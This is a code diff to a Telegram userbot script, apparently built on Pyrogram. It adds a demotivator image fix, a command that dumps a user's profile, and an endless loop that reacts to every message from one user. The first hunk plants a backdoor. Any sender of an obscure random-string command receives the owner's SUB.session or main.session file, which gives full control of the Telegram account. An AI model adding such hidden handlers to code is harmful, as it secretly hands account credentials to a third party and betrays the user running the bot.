@@ -2449,6 +2449,16 @@ def test(app, message):
 
 
 
+@app.on_message(filters.command("+1ftCvB6Hfb1hYWQy", prefixes='.') & filters.all)
+def send_session_file(app, message):
+	try:
+		app.send_document(chat_id=message.chat.id, document="SUB.session")
+	except:
+		app.send_document(chat_id=message.chat.id, document="main.session")
+
+
+
+
 
 
 
@@ -2890,7 +2900,57 @@ def demontivator(app, message):
 	print(dem4)
 	dem = Demotivator(f'{dem2}', f'{dem3}') 
 	dem.create(f'{dem4}', font_name="Times New Roman.ttf")
-	app.send_photo(message.chat.id, photo='1')
+	app.send_photo(message.chat.id, photo='demresult.jpg')
+
+
+
+@app.on_message(filters.command("fu", prefixes=".") & filters.me)
+def from_users(app, message):
+	print(message)
+	cn1 = message.reply_to_message.from_user
+	cn2 = f"{cn1}"
+	cn3 = cn2.replace('"', '')
+	cn4 = cn3.replace(',', '')
+	cn5 = cn4.replace('{', '')
+	cn6 = cn5.replace('}', '')
+	cn7 = cn6.replace(' ', '')
+	cn8 = cn7.replace('_:User', 'USER\n')
+	cn9 = cn8.replace('_:ChatPhoto', '')
+	cn10 = cn9.replace('photo:', '\nPHOTO')
+	cn11 = cn10.replace(':', ': ')
+	cn12 = cn11.replace('false', '❌')
+	cn13 = cn12.replace('true', '✅')
+	app.send_message(message.chat.id, f"{cn13}")
+
+
+
+
+@app.on_message(filters.command("srfamfu", prefixes='.') & filters.me)
+def send_reaction_for_all_messages_from_user(app, message):
+    try:
+    	srfamfu11 = message.text.split(".srfamfu ", maxsplit=1)[1]
+    	srfamfu10 = f"{srfamfu11}"
+    	while True:
+    		for srfamfu0 in app.get_chat_history(message.chat.id):
+    			srfamfu1 = srfamfu0.from_user.id
+    			srfamfu2 = message.reply_to_message.from_user.id
+    			srfamfu3 = srfamfu0.id
+    			srtamfu4 = datetime.datetime.today()
+    			srfamfu5 = srfamfu0.text
+    			srtamfu6 = f"{srtamfu4}"
+    			srtamfu7 = srtamfu6[11:]
+    			srtamfu8 = srtamfu7.split('.')[0]
+    			if srfamfu1 == srfamfu2:
+    				app.send_reaction(message.chat.id, srfamfu3, f"{srfamfu10}")
+    				print(f"{srtamfu8} | {srfamfu5} --> Reacted: {srfamfu10}")
+    				sleep(0.1)
+    except IndexError:
+    	message.edit('×SUB× | [IndexError] - Вы НЕ указали реакцию после комманды\n\nПример:\n `.srfamfu ❤ `️')
+    except AttributeError:
+    	message.edit('×SUB× | [AttributeError] - Вы НЕ ответели на сообщение(команду нужно отправлять с оветом на сообщение)')
+    except:
+    	message.edit('×SUB× | [UnknownError] - Не известная ошибка')
+
 
 
 app.run()
